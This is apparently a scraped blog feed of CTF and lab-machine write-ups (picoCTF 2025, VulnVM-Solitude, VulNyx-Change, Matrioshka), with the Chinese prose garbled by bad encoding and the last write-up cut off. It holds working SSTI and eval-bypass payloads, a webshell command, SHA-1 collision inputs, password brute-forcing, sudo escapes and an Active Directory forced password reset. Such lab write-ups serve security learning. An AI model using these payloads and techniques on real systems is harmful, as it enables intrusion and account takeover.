ˆæº¢å‡ºæ¼æ´ï¼Œä¸è¿‡æ²¡æœ‰å¯ä»¥å†™å…¥çš„åœ°æ–¹ï¼Œä¹Ÿä¸å­˜åœ¨å±é™©å‡½æ•°è¿”å›ã€‚è¿™é‡Œåˆ©ç”¨çš„æ˜¯è¦†ç›–systemçš„å‚æ•°ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆ\\x00ç»“å°¾çš„åˆæ³•linuxæ–‡ä»¶åï¼‰ï¼Œåœ¨ç¯å¢ƒå˜é‡å°†å½“å‰ç›®å½•æ’åœ¨æœ€å‰é¢ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è®¿é—®åˆ°è¯¥ç›®å½•ä¸­çš„så¯æ‰§è¡Œæ–‡ä»¶ï¼Œå†æŒ‚è½½åˆ°ç«¯å£ä¸Šï¼Œé€šè¿‡pwntoolsçš„remoteè¿æ¥ï¼ŒæˆåŠŸææƒã€‚\n","date":"2025-03-12","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-singdancerap/","section":"Posts","summary":"","title":"HackMyVM-SingDanceRap","type":"posts"},{"content":"","date":"2025-03-12","externalUrl":null,"permalink":"/tags/picoctf/","section":"Tags","summary":"","title":"Picoctf","type":"tags"},{"content":"\rWeb #\rCookie Monster Secret Recipe #\rä»»æ„ç™»å½•åå‘ç°Cookieå­—æ®µ\nè¿›è¡ŒURLè§£ç å’ŒBase64è§£ç \nhead-dump #\råœ¨ç½‘é¡µæºç ä¸­å‘ç°ä¸€ä¸ª**/api-docs**è·¯ç”±\nè¿›å…¥ä¹‹åæ‰§è¡Œä¸€ä¸‹**/heapdump**çš„GETæ–¹æ³•ï¼Œå‘ç°å“åº”çš„æ˜¯ä¸€ä¸ªä¸‹è½½é“¾æ¥\nç”¨**notepad++**æ‰“å¼€ï¼Œæœç´¢å­—ç¬¦ä¸²\nn0s4n1ty 1 #\ræ²¡æœ‰ä»»ä½•æ£€éªŒçš„ä¸Šä¼ ï¼Œå¯ä»¥ç›´æ¥ä¼ ä¸€ä¸ªPHPæœ¨é©¬\nä½¿ç”¨sudo -læ£€æŸ¥ï¼Œå‘ç°www-dataå¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œæ— éœ€å¯†ç \nMatching Defaults entries for www-data on challenge:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser www-data may run the following commands on challenge:\r(ALL) NOPASSWD: ALL å¦‚ä¸‹æ„é€ \n/uploads/webshell.php?cmd=sudo cat /root/flag.txt SSTI1 #\rå¦‚ä¸‹æ„é€ å³å¯\n{{lipsum.__globals__.os.popen(\u0026#39;ls\u0026#39;).read()}}\r{{lipsum.__globals__.os.popen(\u0026#39;cat flag\u0026#39;).read()}} WebSockFish #\réšä¾¿ç§»åŠ¨ä¸€ä¸ªå°å…µå‘å‰ä¸€æ­¥\nç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹ä¸ºï¼ševal -10000000000000\n3v@l #\råœ¨ç½‘é¡µæºç ä¸­çœ‹åˆ°è¿‡æ»¤æƒ…å†µ\n\u0026lt;!--\rTODO\r------------\rSecure python_flask eval execution by 1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind\r2.Implementing regex: r\u0026#39;0x[0-9A-Fa-f]+|\\\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\\.[A-Za-z0-9]{1,3}\\b|[\\\\\\/]|\\.\\.\u0026#39;\r--\u0026gt; å°è¯•å¼•å…¥æ¨¡å—ï¼Œä½¿ç”¨åŠ å·æ‹¼æ¥ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸæ‰¾åˆ°osæ¨¡å—\nå°è¯•è°ƒç”¨popenæŸ¥çœ‹ç›®å½•\nå¯ä»¥é€šè¿‡chrå‡½æ•°æ¥ç»•è¿‡å…³é”®å­—ç¬¦\n__import__(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39; + chr(32) + chr(47)).read() __import__(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39; + chr(32) + chr(47)+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;x\u0026#39;+\u0026#39;t\u0026#39;).read() SSTI2 #\ræ„é€ çš„ç›®æ ‡å¦‚ä¸‹\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}} è¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼ï¼Œç”¨setæ¥è¿›è¡Œæ‹¼æ¥å­—ç¬¦ä¸²\n//è·å–ä¸‹åˆ’çº¿ _\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{{line}}\r//è·å–åŒä¸‹åˆ’çº¿ __\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{{dbline}}\r//è·å– __globals__\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{{glbs}}\r//__getitem__\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{{gtem}}\r//all\r{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{%set cmd=\u0026#34;l\u0026#34;+\u0026#34;s\u0026#34; %}{%set rd=\u0026#34;read\u0026#34;%}{%set pp=\u0026#34;po\u0026#34;+\u0026#34;pen\u0026#34;%}{{lipsum|attr(glbs)|attr(gtem)(\u0026#39;os\u0026#39;)|attr(pp)(cmd)|attr(rd)()}} è¯»å–flagå³å¯\n{%set a=\u0026#39;po\u0026#39;+\u0026#39;p\u0026#39;%}{%set line=(lipsum|string|list)|attr(a)(18) %}{%set dbline=line+line%}{%set glbs=dbline+\u0026#34;globals\u0026#34;+dbline%}{%set gtem=dbline+\u0026#34;getitem\u0026#34;+dbline%}{%set cmd=\u0026#34;ca\u0026#34;+\u0026#34;t fl\u0026#34;+\u0026#34;ag\u0026#34; %}{%set rd=\u0026#34;read\u0026#34;%}{%set pp=\u0026#34;po\u0026#34;+\u0026#34;pen\u0026#34;%}{{lipsum|attr(glbs)|attr(gtem)(\u0026#39;os\u0026#39;)|attr(pp)(cmd)|attr(rd)()}} Apriti sesamo #\remacs å¤‡ä»½æ–‡ä»¶åä¸€èˆ¬ä¼šåœ¨åé¢åŠ ä¸€ä¸ª**~**\n\u0026lt;?php\rif (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;pwd\u0026#39;])) {\r$yuf85e0677 = $_POST[\u0026#39;username\u0026#39;];\r$rs35c246d5 = $_POST[\u0026#39;pwd\u0026#39;];\rif ($yuf85e0677 == $rs35c246d5) {\recho \u0026#34;\u0026lt;br\u0026gt;\u0026lt;!-- Security Warning --\u0026gt;\u0026#34;;\r} else {\rif (sha1($yuf85e0677) === sha1($rs35c246d5)) {\recho file_get_contents(\u0026#34;../foobar\u0026#34;);\r} else {\recho \u0026#34;\u0026lt;br\u0026gt;\u0026lt;!-- Security Warning --\u0026gt;\u0026#34;;\r}\r}\r}\r?\u0026gt; å¯ä»¥çœ‹åˆ°æ˜¯SHA1å¼ºæ¯”è¾ƒï¼šctfä¸­å¼ºmd5åŠsha1ç¢°æ’ç»•è¿‡ï¼ˆå­—ç¬¦ä¸²stringå‹ï¼‰-CSDNåšå®¢\nusername=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1\u0026amp;pwd=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 Pachinko #\rå¦‚å›¾è¿çº¿ï¼Œç„¶åæäº¤\n","date":"2025-03-12","externalUrl":null,"permalink":"/posts/2025/03/picoctf-2025/","section":"Posts","summary":"","title":"picoCTF 2025","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Solitude â¯ nmap 192.168.56.115 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 2b:c7:6c:06:c7:80:41:bc:cb:dc:fe:d6:e8:85:db:b0 (RSA)\r| 256 61:d1:67:f9:8f:99:62:9b:d4:9a:70:19:ff:78:bd:77 (ECDSA)\r|_ 256 2b:6e:53:ab:ac:68:ca:78:a7:d6:2f:34:65:e8:5d:17 (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 08:00:27:22:A4:A8 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r| smb2-time: | date: 2025-03-11T20:26:05\r|_ start_date: N/A\r|_nbstat: NetBIOS name: SOLITUDE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown)\r|_clock-skew: 7h59m57s Enum4linux #\r[root@kali] /home/kali/Solitude â¯ enum4linux -a 192.168.56.115\r[+] Enumerating users using SID S-1-22-1 and logon username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; S-1-22-1-1000 Unix User\\garret (Local User) æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·åï¼šgarret\nCrackPasswd #\rå°è¯•å¯¹å…¶è¿›è¡Œå¯†ç çˆ†ç ´\n[root@kali] /home/kali/Solitude â¯ crackmapexec smb 192.168.56.115 -u \u0026#39;garret\u0026#39; -p /usr/share/wordlists/rockyou.txt SMB 192.168.56.115 445 SOLITUDE [+] SOLITUDE\\garret:inuyasha å¾—åˆ°å¯†ç ä¸ºï¼šinuyasha\nSMB #\rä½¿ç”¨smbmapè¿›è¡ŒæŸ¥çœ‹æƒé™\næŸ¥çœ‹Sharedç›®å½•ï¼Œæ˜¯sshå¯†é’¥ï¼Œå°†id_rsaä¸‹è½½ä¸‹æ¥ã€‚\nchmod 600 id_rsa Root #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\ngarret@solitude:~$ sudo -l\rMatching Defaults entries for garret on solitude:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser garret may run the following commands on solitude:\r(ALL) NOPASSWD: /usr/bin/systemctl systemctl | GTFOBins å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„ç¬¬Cæ¡\nsudo systemctl\r!sh Summary #\rUserï¼šé€šè¿‡enum4linuxæ‰¾åˆ°ç”¨æˆ·garretï¼Œä½¿ç”¨crackmapexecè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œåœ¨smbä¸­è·å–åˆ°ç™»é™†å¯†é’¥\nRootï¼šsystemctlæƒé™ä¸å½“ï¼Œç›´æ¥ææƒã€‚\n","date":"2025-03-11","externalUrl":null,"permalink":"/posts/2025/03/vulnvm-solitude/","section":"Posts","summary":"","title":"VulnVM-Solitude","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.114 -sV -A -p- â\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-11 02:36:46Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megachange.nyx0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r9389/tcp open mc-nmf .NET Message Framing\r47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49671/tcp open msrpc Microsoft Windows RPC\r49674/tcp open msrpc Microsoft Windows RPC\r49675/tcp open msrpc Microsoft Windows RPC\r49680/tcp open msrpc Microsoft Windows RPC\r49697/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:DD:48:CA (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Microsoft Windows 2019\rOS details: Microsoft Windows Server 2019\rNetwork Distance: 1 hop\rService Info: Host: CHANGE; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 15h59m57s\r|_nbstat: NetBIOS name: CHANGE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:dd:48:ca (Oracle VirtualBox virtual NIC)\r| smb2-time: | date: 2025-03-11T02:37:41\r|_ start_date: N/A æŠŠmegachange.nyxæ·»åŠ åˆ°**/etc/hosts**\nå†é€šè¿‡Kerberosç«¯å£æšä¸¾ä¸€ä¸‹ç”¨æˆ·\n[root@kali] /home/kali/Desktop â¯ nmap --script=krb5-enum-users --script-args=krb5-enum-users.realm=megachange.nyx -p88 192.168.56.114 â\rHost is up (0.00023s latency).\rPORT STATE SERVICE\r88/tcp open kerberos-sec\r| krb5-enum-users: | Discovered Kerberos principals\r| administrator@megachange.nyx\r|_ sysadmin@megachange.nyx\rMAC Address: 08:00:27:DD:48:CA (Oracle VirtualBox virtual NIC)\rNmap done: 1 IP address (1 host up) scanned in 0.23 seconds UserEnum #\rå¯ä»¥ä½¿ç”¨çš„å­—å…¸ï¼škerberos_enum_dict/userlists_english/usernames.txt at master Â· jearyorg/kerberos_enum_dict\nå†ç”¨msfçš„æ¨¡å—è¿›è¡Œæ¢æµ‹ä¸€ä¸‹\nmsf6 auxiliary(gather/kerberos_enumusers) \u0026gt; run\r[*] Using domain: MEGACHANGE.NYX - 192.168.56.114:88 ...\r[+] 192.168.56.114 - User: \u0026#34;administrator\u0026#34; is present\r[+] 192.168.56.114 - User: \u0026#34;alfredo\u0026#34; is present\r[+] 192.168.56.114 - User: \u0026#34;change\u0026#34; is present\r[-] 192.168.56.114 - User: \u0026#34;guest\u0026#34; account disabled or expired é‚£ä¹ˆæ•´åˆä¸€ä¸‹ç°åœ¨è·å–åˆ°çš„ç”¨æˆ·ååˆ—è¡¨\nadministrator\rsysadmin\rchange\ralfredo BruteUser #\r[root@kali] /home/kali/Desktop â¯ ./kerbrute bruteuser --dc 192.168.56.114 -d megachange.nyx /usr/share/wordlists/rockyou.txt alfredo\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop\r2025/03/11 11:41:04 \u0026gt; Using KDC(s):\r2025/03/11 11:41:04 \u0026gt; 192.168.56.114:88\r2025/03/11 11:41:09 \u0026gt; [+] VALID LOGIN: alfredo@megachange.nyx:Password1\r2025/03/11 11:41:09 \u0026gt; Done! Tested 3527 logins (1 successes) in 5.049 seconds å¾—åˆ°alfredoçš„å¯†ç æ˜¯Password1ï¼Œå†ç”¨crackmapexecçœ‹çœ‹ç”¨æˆ·ï¼Œç¡®å®åªæœ‰è¿™å‡ ä¸ªã€‚\nBloodhound #\rä½¿ç”¨bloodhound-pythonè¿›è¡Œè·å–\n[root@kali] /home/kali/Change â¯ bloodhound-python -u alfredo -p Password1 -ns 192.168.56.114 -d megachange.nyx -c all --zip\rINFO: Found AD domain: megachange.nyx\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (change.megachange.nyx:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: change.megachange.nyx\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: change.megachange.nyx\rINFO: Found 6 users\rINFO: Found 52 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: CHANGE.megachange.nyx\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250311140042_bloodhound.zip å¯ä»¥çœ‹åˆ°alfredoå¯ä»¥å¼ºåˆ¶ä¿®æ”¹sysadminçš„å¯†ç ã€‚\nForceChangePassword #\rä½¿ç”¨bloodyADæ¥è¿›è¡Œä¿®æ”¹å¯†ç \n[root@kali] /home/kali â¯ bloodyAD --host \u0026#34;192.168.56.114\u0026#34; -d \u0026#34;megachange.nyx\u0026#34; -u \u0026#34;alfredo\u0026#34; -p \u0026#34;Password1\u0026#34; set password SYSADMIN \u0026#39;123456ABC!\u0026#39; â\r[+] Password changed successfully! ä¿®æ”¹ä¹‹åï¼Œå¯ä»¥é€šè¿‡5985ç«¯å£è¿›è¡Œç™»å½•ï¼Œæ‹¿åˆ°user.txt\nRoot #\ræŸ¥çœ‹å½“å‰SYSADMINçš„æ‰€å±ç»„ä»¥åŠæƒé™\n*Evil-WinRM* PS C:\\tmp\u0026gt; whoami /groups\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes\r=========================================== ================ ============ ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448\r*Evil-WinRM* PS C:\\tmp\u0026gt; whoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= ============================== =======\rSeMachineAccountPrivilege Add workstations to domain Enabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled æ²¡æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ã€‚ä¸Šä¼ Winpeasè¿›è¡Œåˆ†æ\nå‘ç°å­˜åœ¨è‡ªåŠ¨ç™»å½•çš„å¯†ç ï¼\nå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨evil-winrmè¿›è¡Œç™»å½•\nSummary #\rUserï¼šé€šè¿‡Kerberosè¿›è¡Œç”¨æˆ·æšä¸¾ï¼Œå»ºè®®ä½¿ç”¨å¤§ä¸€ç‚¹çš„å­—å…¸ï¼Œç„¶åå¯¹alfredoè¿›è¡Œå¯†ç çˆ†ç ´ã€‚ä½¿ç”¨bloodhoundè¿›è¡ŒåŸŸå†…åˆ†æï¼Œå¾—å‡ºalfredoå¯ä»¥ä¿®æ”¹sysadminçš„å¯†ç ï¼Œä¿®æ”¹åå¯ä»¥ç™»å½•sysadminæ‹¿åˆ°user.txt\nRootï¼šç”±äºsysadminä¸å±äºç‰¹æ®Šç»„ï¼Œä¹Ÿæ²¡æœ‰ç‰¹æ®Šæƒé™ã€‚é€šè¿‡Winpeasè¾“å‡ºå¯ä»¥å¾—åˆ°å­˜åœ¨è‡ªåŠ¨ç™»å½•çš„ç®¡ç†å‘˜å‡­è¯ï¼Œå¯ä»¥ç›´æ¥ç™»å½•åˆ°Administratorï¼ˆè¦æ³¨æ„ç™»å½•çš„æ—¶å€™ä¸è¦å†™æˆadministratorï¼‰ï¼Œæ‹¿åˆ°root.txt\n","date":"2025-03-11","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-change/","section":"Posts","summary":"","title":"VulNyx-Change","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Matrioshka â¯ nmap 192.168.56.108 -sV -A -p- -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:df:2c:8e:93:4e (ECDSA)\r|_ 256 5d:3d:2b:43:fc:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)\r80/tcp open http Apache httpd 2.4.61 ((Debian))\r|_http-server-header: Apache/2.4.61 (Debian)\r|_http-title: mamushka\rMAC Address: 08:00:27:D5:7C:4C (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 5.X\rOS CPE: cpe:/o:linux:linux_kernel:5\rOS details: Linux 5.0 - 5.5\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel å°†mamushka.hmvæ·»åŠ åˆ°**/etc/hosts**\nWPscan #\rå¯ä»¥çœ‹åˆ°æ˜¯Wordpressæ­å»ºçš„ç½‘ç«™\næ‰¾åˆ°ç”¨æˆ·åæ˜¯admin\nè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯aggressiveæ¨¡å¼æ¥æ‰«ææ’ä»¶\n[root@kali] /home/kali/Matrioshka â¯ wpscan --url \u0026#34;http://mamushka.hmv/\u0026#34; --plugins-detection aggressive --plugins-version-detection aggressive --api-token \u0026lt;YOUR-TOKEN\u0026gt;\r\u0026lt;PASS\u0026gt;\r[i] Plugin(s) Identified:\r[+] akismet\r| Location: http://mamushka.hmv/wp-content/plugins/akismet/\r| Latest Version: 5.3.7\r| Last Updated: 2025-02-14T18:49:00.000Z\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/akismet/, status: 403\r|\r| [!] 1 vulnerability identified:\r|\r| [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\r| Fixed in: 3.1.5\r| References:\r| - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\r| - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\r| - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\r|\r| The version could not be determined.\r[+] meta-generator-and-version-info-remover\r| Location: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/\r| Latest Version: 16.0 (up to date)\r| Last Updated: 2024-11-20T05:03:00.000Z\r| Readme: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/, status: 403\r|\r| Version: 16.0 (100% confidence)\r| Found By: Readme - Stable Tag (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\r[+] ultimate-member\r| Location: http://mamushka.hmv/wp-content/plugins/ultimate-member/\r| Last Updated: 2025-03-03T17:36:00.000Z\r| Readme: http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\r| [!] The version is out of date, the latest version is 2.10.1\r|\r| Found By: Known Locations (Aggressive Detection)\r| - http://mamushka.hmv/wp-content/plugins/ultimate-member/, status: 403\r|\r| [!] 7 vulnerabilities identified:\r|\r| [!] Title: Ultimate Member \u0026lt; 2.8.7 - Cross-Site Request Forgery to Membership Status Change\r| Fixed in: 2.8.7\r| References:\r| - https://wpscan.com/vulnerability/2b670a80-2682-4b7f-a549-64a35345e630\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8520\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ffddc03-d4ae-460e-972a-98804d947d09\r|\r| [!] Title: Ultimate Member \u0026lt; 2.8.7 - Authenticated (Contributor+) Stored Cross-Site Scripting\r| Fixed in: 2.8.7\r| References:\r| - https://wpscan.com/vulnerability/7488f9f3-03ea-4f4e-b5fb-c0dd02c5bb59\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8519\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/9e394bb2-d505-4bf1-b672-fea3504bf936\r|\r| [!] Title: Ultimate Member \u0026lt; 2.9.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary User Profile Picture Update\r| Fixed in: 2.9.0\r| References:\r| - https://wpscan.com/vulnerability/54a53b30-4249-4559-85f8-7aeac2dc0df2\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10528\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a9793b6-2186-46ef-b204-d8f8f154ebf3\r|\r| [!] Title: Ultimate Member â€“ User Profile, Registration, Login, Member Directory, Content Restriction \u0026amp; Membership Plugin \u0026lt; 2.9.2 - Information Exposure\r| Fixed in: 2.9.2\r| References:\r| - https://wpscan.com/vulnerability/cb9c5ef8-51f8-4a46-ae56-23302c5980aa\r| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0318\r| - https://www.wordfence.com/threat-intel/vulnerabilities/id/4ee149bf-ffa3-4906-8be2-9c3c40b28287\r|\r| [!] Title: Ultimate Member \u0026lt; 2.9.2 - Unauthenticated SQL Injection\r| Fixed in: 2.9.2\r| References:\r| - 